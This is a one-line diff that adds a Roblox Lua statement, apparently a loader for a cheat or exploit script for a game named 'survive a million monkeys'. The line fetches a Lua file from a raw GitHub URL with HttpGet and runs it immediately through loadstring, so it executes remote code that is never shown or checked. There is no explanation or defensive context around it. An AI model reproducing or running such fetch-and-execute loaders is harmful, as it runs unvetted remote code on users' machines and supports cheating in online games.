@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Swarmzorouter/loaders/main/loaders/survive-a-million-monkeys-spam7-2bcjixm1o9ac5y.lua"))()
